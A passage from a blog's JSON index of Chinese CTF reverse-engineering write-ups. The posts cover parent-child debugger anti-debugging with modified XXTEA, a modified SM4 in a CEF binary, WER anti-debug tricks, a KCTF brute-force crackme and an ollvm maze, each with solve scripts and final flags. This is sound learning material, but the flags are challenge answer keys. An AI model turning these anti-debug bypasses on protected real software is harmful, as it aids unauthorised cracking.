这里一处函数需要注意 WaitForDebugEvent表明父进程调用子进程是以调试方式打开，也就是说父进程调试子进程，所以实际上子进程的反调试是不能绕过的，正常执行程序应该会进入子进程的if语句，对key和delta进行一些魔改运算。0xC0000005，这是一个异常代码，代表EXCEPTION_ACCESS_VIOLATION，内存访问异常，也即子进程中触发的异常。 也就是说，子进程被父进程调试，当子进程发生异常，应当交由调试者（父进程）处理。所以当子进程中触发异常，程序就会流回父进程，判断是否为内存访问异常，如果是，就对eip和eax做出相应修改。 再回去看子进程触发异常的地方，eip+5之后正好跳过了会触发异常的地方。而eax里存储的实际上是delta经过一通魔改运算之后的结果。也就是说，delta不仅在子进程里被修改，还会在父进程里异或一次，也就是还原成之前最初的模样 前一半的（修改的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x1c925d64#define MX (((z&gt;&gt;6^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))uint32_t k[4]= &#123;0x12,0x90,0x56,0x78&#125;;void xxtea(uint32_t* v, int n, uint32_t* key)&#123; unsigned int sum,z,p,y; int e, rounds; rounds = 6 + 52/n; sum = rounds * DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) &#123; z = v[p-1]; y = v[p] -= MX; &#125; z = v[n-1]; y = v[0] -= MX; sum -= DELTA; &#125; while (--rounds);&#125;int main()&#123; uint32_t v[5] = &#123;0x6b7ce328,0x4841d5dd,0x963784dc,0xef8a3226,0x776b226&#125;; int n = 5; xxtea(v, n, k); int i; for(i=0;i&lt;5;i++) &#123; printf(&quot;%c&quot;,v[i]&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;8&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;16&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;24&amp;0xff); &#125; return 0;&#125; 后面那半就比较好出了，没有改任何Delta数或XXTEA算法 miniLctf{cbda59ff59e3e90c91c02e9b40b78b} 参考：miniL2022 WP 今晚恰烤lq！ - 云之君 (yunzh1jun.com)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"TLS回调函数","slug":"TLS回调函数","permalink":"http://example.com/tags/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"},{"name":"反调试","slug":"反调试","permalink":"http://example.com/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"异常处理","slug":"异常处理","permalink":"http://example.com/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"CEF","slug":"cef","date":"2022-05-26T16:00:00.000Z","updated":"2022-05-27T14:31:42.247Z","comments":true,"path":"2022/05/27/cef/","link":"","permalink":"http://example.com/2022/05/27/cef/","excerpt":"","text":"32位无壳程序 CEF简介: 嵌入式Chromium框架(简称CEF) 是一个由Marshall Greenblatt在2008建立的开源项目，它主要目的是开发一个基于Google Chromium的Webbrowser控件。CEF支持一系列的编程语言和操作系统，并且能很容易地整合到新的或已有的工程中去。 解题：正面去分析的话，十分困难。去搜索相应字符串无果 这里我们可以去从数据调用去分析，我们去分析.data的数据 一组奇怪的数据，猜测加密时用到，交叉引用找到调用的地方 调试验证一下，一开始会停在调用的dll函数里面，我们直接步过，然后输入32位之后就会断下F9提示correct，验证我们的猜想是正确的。调试发现其实，加密整个逻辑就在else里面，一个魔改的SM4，其基本运算为异或^和循环左移&lt;&lt;&lt; round函数 解密： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned int SK[32] = &#123; 0xE8DB227C, 0x012451B9, 0xED08A9DB, 0xC91F65C3, 0xB3D1E981, 0x319B4734, 0xA4BA5551, 0xD0F2ED2D, 0x4A00D692, 0xE0AEFE30, 0x6BBCDB4A, 0xC315F6F1, 0xB4E1B030, 0x694C4ACE, 0x479208D3, 0x3F8C7B97, 0x747777A6, 0xEDEC9BBB, 0xC8E506C1, 0xB955A92A, 0xB388FDBB, 0x1A4697C3, 0xB10826AA, 0xBB1F2207, 0x291DCD60, 0x2BA3E3A7, 0x1B83DFDD, 0x014D4FD5, 0x80C659F3, 0x3EB45B23, 0x43E36266, 0xBD22532C&#125;;#define GET_ULONG(n, b, i) \\ (n) = ( (unsigned long) (b)[(i + 3)] &lt;&lt; 24 ) \\ | ( (unsigned long) (b)[(i + 2)] &lt;&lt; 16 ) \\ | ( (unsigned long) (b)[(i + 1)] &lt;&lt; 8 ) \\ | ( (unsigned long) (b)[(i )] ); \\#define PUT_ULONG(n, b, i) \\&#123; \\ (b)[(i) + 3] = (unsigned char) ( (n) &gt;&gt; 24 ); \\ (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 16 ); \\ (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 8 ); \\ (b)[(i) ] = (unsigned char) ( (n) ); \\&#125; #define SHL(x, n) ( ((x) &amp; 0xFFFFFFFF) &lt;&lt; n )#define ROTL(x, n) ( SHL((x), n) | ((x) &gt;&gt; (32 - n)) )#define SWAP(a, b) &#123; unsigned t = a; a = b; b = t; t = 0; &#125; void SM4_Decrypt(unsigned char * input, unsigned char * output, int len); void Round(unsigned char input[16], unsigned char output[16]);int main(void)&#123; unsigned char input[] = &#123; 0x7D, 0x54, 0xCB, 0xC0, 0x74, 0xDB, 0xF5, 0xD7, 0x6F, 0xD9, 0x92, 0x1B, 0xEB, 0x28, 0x46, 0x20, 0xE5, 0xD5, 0xD3, 0x60, 0x80, 0x6D, 0x36, 0x2F, 0xB0, 0x63, 0x2F, 0x61, 0x20, 0x0F, 0xA9, 0x30 &#125;; unsigned char output[32] = &#123; 0 &#125;; int i; SM4_Decrypt(input, output, 32); for ( i = 0; i &lt; 32; i++ ) &#123;// printf(&quot;0x%X, &quot;, output[i]); printf(&quot;%c&quot;, output[i]); &#125; return 0;&#125;void SM4_Decrypt(unsigned char * input, unsigned char * output, int len)&#123; int i; for ( i = 0; i &lt; 16; i++ ) SWAP(SK[i], SK[31 - i]); while ( len &gt; 0 ) &#123; Round(input, output); input += 16; output += 16; len -= 16; &#125;&#125;void Round(unsigned char input[16], unsigned char output[16])&#123; unsigned long tmp[4] = &#123; 0 &#125;; int i; unsigned int t = 0; GET_ULONG(tmp[0], input, 0); GET_ULONG(tmp[1], input, 4); GET_ULONG(tmp[2], input, 8); GET_ULONG(tmp[3], input, 12); for ( i = 0; i &lt; 32; i++ ) &#123; t = SK[i] ^ tmp[(i + 1) % 4] ^ tmp[(i + 2) % 4] ^ tmp[(i + 3) % 4]; tmp[i % 4] ^= t ^ ROTL(t, 2) ^ ROTL(t, 24) ^ ROTL(t, 10) ^ ROTL(t, 18); &#125; for ( i = 0 ; i &lt; 4; i++ ) GET_ULONG(SK[26 - i], input, i * 4); // 正好是把加密后的值放入 那么解密的时候就是把密文放入即可 PUT_ULONG(tmp[3], output, 0); PUT_ULONG(tmp[2], output, 4); PUT_ULONG(tmp[1], output, 8); PUT_ULONG(tmp[0], output, 12);&#125; 运行得到 3b2365b04700b5eac3a5fd0ba21b687f 参考：DASCTF2022 X VOID-CEF - P.Z’s Blog (ppppz.net)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-CEF","slug":"CEF","permalink":"http://example.com/tags/CEF/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"WER","slug":"WER","date":"2022-05-25T16:00:00.000Z","updated":"2022-05-26T14:18:22.094Z","comments":true,"path":"2022/05/26/WER/","link":"","permalink":"http://example.com/2022/05/26/WER/","excerpt":"","text":"无壳，64位 什么是WER：Windows 错误报告 (WER) 是一种灵活的基于事件的反馈基础结构，旨在收集有关Windows可以检测、向 Microsoft 报告信息以及为用户提供任何可用解决方案的硬件和软件问题的相关信息。 参考：关于 WER - Win32 apps | Microsoft Docs 其关键函数如下： 123DWORD WINAPI ApplicationRecoveryCallback( PVOID pvParameter //上下文信息在调用‎‎注册应用程序恢复回拨‎‎函数以注册恢复时指定。‎); ‎应用程序定义的回调函数，用于在应用程序遇到未处理的异常或无响应时保存数据和应用程序状态信息。 参考：ApplicationRecoveryCallback callback function (Windows) | Microsoft Docs 1234HRESULT WerReportHang( [in] HWND hwndHungApp, //‎处理未响应的窗口。 [in, optional] PCWSTR pwzHungApplicationName //要在挂起的报告 UI 中显示的无响应应用程序的名称。); 返回值‎：‎返回S_OK函数是否能够在失败时启动报告或错误代码。请注意，S_OK并不一定意味着“无响应”报告已成功完成，而只是表示已启动。‎ 参考：WerReportHang function (errorrep.h) - Win32 apps | Microsoft Docs 主要运行逻辑为： 1.在初始化注册ApplicationRecoveryCallback函数 2.在OnExit调用WerReportHang触发异常 3.运用ApplicationRecoveryCallback进行真正的逻辑处理。 本题OnExit函数就在main函数里面，调用WerReportHang就会关闭调试器，调试不起来 解题： 搜索关键函数，在import表里面找到，放在了一个dll里面 然后交叉引用找到： 这里的sub_14000F3B0就是我们要找的关键函数 也可以通过MessageBox函数来找。 123data = [ 0x05, 0x03, 0x55, 0x05, 0x04, 0x07, 0x5E, 0x54, 0x05, 0x07, 0x50, 0x02, 0x03, 0x53, 0x5F, 0x50, 0x53, 0x50, 0x53, 0x05, 0x55, 0x00, 0x54, 0x55, 0x57, 0x03, 0x05, 0x02, 0x52, 0x50, 0x51, 0x53]for i in range(len(data)): print(chr(data[i] ^ 102), end = &quot;&quot;) 异或写脚本得到flag","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[wer]","slug":"wer","permalink":"http://example.com/tags/wer/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"末日邀请","slug":"KCTF-末日邀请（加密闯关）","date":"2022-05-23T16:00:00.000Z","updated":"2022-05-24T15:49:32.139Z","comments":true,"path":"2022/05/24/KCTF-末日邀请（加密闯关）/","link":"","permalink":"http://example.com/2022/05/24/KCTF-%E6%9C%AB%E6%97%A5%E9%82%80%E8%AF%B7%EF%BC%88%E5%8A%A0%E5%AF%86%E9%97%AF%E5%85%B3%EF%BC%89/","excerpt":"","text":"先是输入flag也就是ID，然后进行check，主要考察算法。 对我们的输入进行一系列异或，最后赋值给v39，注意这里v39类型是char，接着进行sbox数据初始化， 然后进行CRC32验证，这里可以动调取到flag，这里v34的值后面会给出并进行验证。 接着先将字符转成数值，存入内存，并且如果大于58就减去55.接着用冰雹猜想验证输入的前三位。我们可以爆破得到v17的值是定值7.具体前三位先按下不表 爆破代码： 123456789101112131415161718192021222324252627#include &lt;cstring&gt;#include &lt;iostream&gt;using namespace std;int i; // edxint v13; // ecxint v15; // eaxint j; // edxint v17; // ediint v33[200]; // [esp+10h] [ebp-368h]int main()&#123; for (int i = 0; i &lt;= 0xff; i++) &#123; v13 = i; v15 = v13; for (j = 1; j &lt; 200; ++j) &#123; if ((v15 &amp; 1) != 0) // 奇数*3+1 v15 = 3 * v15 + 1; else v15 &gt;&gt;= 1; // 偶数右移1 v33[j] = v15; &#125; v17 = v33[198] | v33[197] | v33[196]; cout &lt;&lt; v17 &lt;&lt; endl; &#125;&#125; 后面就是判断后四位是否为KCTF 动调发现是v41[1]是输入的第8个字符，推测后面还需要验证九位，然后进行取余验证，依次取最高前i位，看是否能取余i，不能则失败。但是后面对这里有一个约束。先是冒泡排序从小到大排序，然后对比19，也就是必须包含19每个数字 爆破取得这九位：381654729 12345for i in range(100000000,1000000000): if i//10000000 %2 == 0 and i//1000000%3 == 0 and i//100000%4 == 0 and i//10000%5 == 0 and i//1000 %6 == 0 and i//100 % 7 == 0 and i//10 % 8 == 0 and i%9 == 0: num_all = str(i) if &quot;1&quot; in num_all and &quot;2&quot; in num_all and &quot;3&quot; in num_all and &quot;4&quot; in num_all and &quot;5&quot; in num_all and &quot;6&quot; in num_all and &quot;7&quot; in num_all and &quot;8&quot; in num_all and &quot;9&quot; in num_all : print(i) 最后就是判断v34是否相等 也就是前三位 爆破得到前三位：421 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; uint32_t magic_arr[] = &#123;0x00000000, 0x09073096, 0x120E612C, 0x1B0951BA, 0xFF6DC419, 0xF66AF48F, 0xED63A535, 0xE46495A3, 0xFEDB8832, 0xF7DCB8A4, 0xECD5E91E, 0xE5D2D988, 0x01B64C2B, 0x08B17CBD, 0x13B82D07, 0x1ABF1D91, 0xFDB71064, 0xF4B020F2, 0xEFB97148, 0xE6BE41DE, 0x02DAD47D, 0x0BDDE4EB, 0x10D4B551, 0x19D385C7, 0x036C9856, 0x0A6BA8C0, 0x1162F97A, 0x1865C9EC, 0xFC015C4F, 0xF5066CD9, 0xEE0F3D63, 0xE7080DF5, 0xFB6E20C8, 0xF269105E, 0xE96041E4, 0xE0677172, 0x0403E4D1, 0x0D04D447, 0x160D85FD, 0x1F0AB56B, 0x05B5A8FA, 0x0CB2986C, 0x17BBC9D6, 0x1EBCF940, 0xFAD86CE3, 0xF3DF5C75, 0xE8D60DCF, 0xE1D13D59, 0x06D930AC, 0x0FDE003A, 0x14D75180, 0x1DD06116, 0xF9B4F4B5, 0xF0B3C423, 0xEBBA9599, 0xE2BDA50F, 0xF802B89E, 0xF1058808, 0xEA0CD9B2, 0xE30BE924, 0x076F7C87, 0x0E684C11, 0x15611DAB, 0x1C662D3D, 0xF6DC4190, 0xFFDB7106, 0xE4D220BC, 0xEDD5102A, 0x09B18589, 0x00B6B51F, 0x1BBFE4A5, 0x12B8D433, 0x0807C9A2, 0x0100F934, 0x1A09A88E, 0x130E9818, 0xF76A0DBB, 0xFE6D3D2D, 0xE5646C97, 0xEC635C01, 0x0B6B51F4, 0x026C6162, 0x196530D8, 0x1062004E, 0xF40695ED, 0xFD01A57B, 0xE608F4C1, 0xEF0FC457, 0xF5B0D9C6, 0xFCB7E950, 0xE7BEB8EA, 0xEEB9887C, 0x0ADD1DDF, 0x03DA2D49, 0x18D37CF3, 0x11D44C65, 0x0DB26158, 0x04B551CE, 0x1FBC0074, 0x16BB30E2, 0xF2DFA541, 0xFBD895D7, 0xE0D1C46D, 0xE9D6F4FB, 0xF369E96A, 0xFA6ED9FC, 0xE1678846, 0xE860B8D0, 0x0C042D73, 0x05031DE5, 0x1E0A4C5F, 0x170D7CC9, 0xF005713C, 0xF90241AA, 0xE20B1010, 0xEB0C2086, 0x0F68B525, 0x066F85B3, 0x1D66D409, 0x1461E49F, 0x0EDEF90E, 0x07D9C998, 0x1CD09822, 0x15D7A8B4, 0xF1B33D17, 0xF8B40D81, 0xE3BD5C3B, 0xEABA6CAD, 0xEDB88320, 0xE4BFB3B6, 0xFFB6E20C, 0xF6B1D29A, 0x12D54739, 0x1BD277AF, 0x00DB2615, 0x09DC1683, 0x13630B12, 0x1A643B84, 0x016D6A3E, 0x086A5AA8, 0xEC0ECF0B, 0xE509FF9D, 0xFE00AE27, 0xF7079EB1, 0x100F9344, 0x1908A3D2, 0x0201F268, 0x0B06C2FE, 0xEF62575D, 0xE66567CB, 0xFD6C3671, 0xF46B06E7, 0xEED41B76, 0xE7D32BE0, 0xFCDA7A5A, 0xF5DD4ACC, 0x11B9DF6F, 0x18BEEFF9, 0x03B7BE43, 0x0AB08ED5, 0x16D6A3E8, 0x1FD1937E, 0x04D8C2C4, 0x0DDFF252, 0xE9BB67F1, 0xE0BC5767, 0xFBB506DD, 0xF2B2364B, 0xE80D2BDA, 0xE10A1B4C, 0xFA034AF6, 0xF3047A60, 0x1760EFC3, 0x1E67DF55, 0x056E8EEF, 0x0C69BE79, 0xEB61B38C, 0xE266831A, 0xF96FD2A0, 0xF068E236, 0x140C7795, 0x1D0B4703, 0x060216B9, 0x0F05262F, 0x15BA3BBE, 0x1CBD0B28, 0x07B45A92, 0x0EB36A04, 0xEAD7FFA7, 0xE3D0CF31, 0xF8D99E8B, 0xF1DEAE1D, 0x1B64C2B0, 0x1263F226, 0x096AA39C, 0x006D930A, 0xE40906A9, 0xED0E363F, 0xF6076785, 0xFF005713, 0xE5BF4A82, 0xECB87A14, 0xF7B12BAE, 0xFEB61B38, 0x1AD28E9B, 0x13D5BE0D, 0x08DCEFB7, 0x01DBDF21, 0xE6D3D2D4, 0xEFD4E242, 0xF4DDB3F8, 0xFDDA836E, 0x19BE16CD, 0x10B9265B, 0x0BB077E1, 0x02B74777, 0x18085AE6, 0x110F6A70, 0x0A063BCA, 0x03010B5C, 0xE7659EFF, 0xEE62AE69, 0xF56BFFD3, 0xFC6CCF45, 0xE00AE278, 0xE90DD2EE, 0xF2048354, 0xFB03B3C2, 0x1F672661, 0x166016F7, 0x0D69474D, 0x046E77DB, 0x1ED16A4A, 0x17D65ADC, 0x0CDF0B66, 0x05D83BF0, 0xE1BCAE53, 0xE8BB9EC5, 0xF3B2CF7F, 0xFAB5FFE9, 0x1DBDF21C, 0x14BAC28A, 0x0FB39330, 0x06B4A3A6, 0xE2D03605, 0xEBD70693, 0xF0DE5729, 0xF9D967BF, 0xE3667A2E, 0xEA614AB8, 0xF1681B02, 0xF86F2B94, 0x1C0BBE37, 0x150C8EA1, 0x0E05DF1B, 0x0702EF8D&#125;; char cstr[] = &quot;...KCTF381654729&quot;; int main() &#123; for (int i = 0x20; i &lt; 0x7e; i++) &#123; for (int j = 0x20; j &lt; 0x7e; j++) &#123; for (int k = 0x20; k &lt; 0x7e; k++) &#123; cstr[0] = i; cstr[1] = j; cstr[2] = k; int32_t v11 = -1; for (int idx = 0; idx &lt; 16; idx++) &#123; v11 = magic_arr[(uint8_t)(v11 ^ cstr[idx])] ^ (v11 &gt;&gt; 8); &#125; if ((~v11) == 0xF52E0765) &#123; printf(&quot;%c %c %c\\n&quot;, i, j, k); &#125; &#125; &#125; &#125;&#125; 最后的flag:421KCTF381654729","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-加解密","slug":"加解密","permalink":"http://example.com/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"ezam","slug":"ezam（ollvm 迷宫 进制）","date":"2022-05-23T16:00:00.000Z","updated":"2022-05-28T09:03:02.930Z","comments":true,"path":"2022/05/24/ezam（ollvm 迷宫 进制）/","link":"","permalink":"http://example.com/2022/05/24/ezam%EF%BC%88ollvm%20%E8%BF%B7%E5%AE%AB%20%E8%BF%9B%E5%88%B6%EF%BC%89/","excerpt":"","text":"题目打开 标准的ollvm混肴，用脚本两次去除 得到正常的程序 初步分析是以为多项式相加，疏忽了v17以及前面一大段数据的初始化。想着用z3硬解失败了。主要逻辑为读取输入，判断是否为数字，然后转换成四进制，走迷宫。前面的一大段加密是初始化迷宫地图v17，我们可以动调得到一个16*28的迷宫：（做题多尝试 123456789101112131415161,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,1,1,1,1,1,1,1,1,0,0,0,1,0,0,0,0,0,1,1,0,1,1,0,0,1,0,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,1,1,0,0,1,0,0,1,0,0,0,1,0,0,0,1,1,1,0,0,0,1,0,1,1,0,0,0,1,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,1,0,0,1,0,1,0,0,0,1,1,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,1,0,1,1,1,0,0,1,1,1,1,1,1,1,1,0,0,1,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0 下面看一下 sub_400670 函数 ，结合动调，是十进制转四进制算法。下面就是迷宫出走方式得到两条路径，根据函数判断路径长度是45，所以是上面那条232222322330030000303322223333333222233333333232222322330030000303322222222222333333300033333333然后四进制转十进制得到flag 1234567891011def anyToDecimal(num,n): baseStr = &#123;&quot;0&quot;:0,&quot;1&quot;:1,&quot;2&quot;:2,&quot;3&quot;:3,&quot;4&quot;:4,&quot;5&quot;:5,&quot;6&quot;:6,&quot;7&quot;:7,&quot;8&quot;:8,&quot;9&quot;:9, &quot;a&quot;:10,&quot;b&quot;:11,&quot;c&quot;:12,&quot;d&quot;:13,&quot;e&quot;:14,&quot;f&quot;:15,&quot;g&quot;:16,&quot;h&quot;:17,&quot;i&quot;:18,&quot;j&quot;:19&#125; new_num = 0 nNum = len(num) - 1 for i in num: new_num = new_num + baseStr[i]*pow(n,nNum) nNum = nNum -1 print(new_num)anyToDecimal(&#x27;232222322330030000303322223333333222233333333&#x27;, 4) flag{902741462666576198076399615}","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"迷宫","slug":"迷宫","permalink":"http://example.com/tags/%E8%BF%B7%E5%AE%AB/"},{"name":"进制","slug":"进制","permalink":"http://example.com/tags/%E8%BF%9B%E5%88%B6/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]}]}